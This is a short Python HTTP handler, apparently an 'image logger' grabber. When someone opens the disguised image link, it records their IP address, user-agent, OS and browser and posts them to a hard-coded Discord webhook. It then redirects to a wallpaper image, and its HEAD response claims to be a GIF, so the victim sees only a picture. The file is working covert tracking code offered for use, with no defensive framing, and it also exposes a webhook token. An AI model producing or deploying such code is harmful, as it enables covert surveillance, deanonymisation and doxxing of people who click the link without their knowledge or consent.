from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser
import json
from urllib.parse import urlparse, parse_qs

# ================== CONFIG ==================
WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QHFw_ikNw-wpFG3NB8AN02Xl-rGMTn_8ejJxvyTWYyxOhdZ3P3U1tNQ_BV"   # ← CHANGE THIS
IMAGE_URL   = "https://wallpaperaccess.com/full/2060613.jpg"                                      # ← Change to any image/GIF you want

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Get user info
            ip = self.headers.get('x-forwarded-for', self.client_address[0])
            user_agent = self.headers.get('user-agent', 'Unknown')
            parsed_ua = httpagentparser.detect(user_agent)

            # Log to Discord
            data = {
                "content": "**Someone opened the image!**",
                "embeds": [{
                    "title": "Image Logger Hit",
                    "color": 0x00ff00,
                    "fields": [
                        {"name": "IP", "value": ip, "inline": True},
                        {"name": "User-Agent", "value": user_agent[:500], "inline": False},
                        {"name": "OS", "value": parsed_ua.get('os', {}).get('name', 'Unknown'), "inline": True},
                        {"name": "Browser", "value": parsed_ua.get('browser', {}).get('name', 'Unknown'), "inline": True},
                    ],
                    "timestamp": "now"
                }]
            }

            requests.post(WEBHOOK_URL, json=data, timeout=5)

            # Redirect to the real image
            self.send_response(302)
            self.send_header('Location', IMAGE_URL)
            self.end_headers()

        except Exception as e:
            # Fallback if anything breaks
            self.send_response(302)
            self.send_header('Location', IMAGE_URL)
            self.end_headers()

    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-type', 'image/gif')
        self.end_headers()
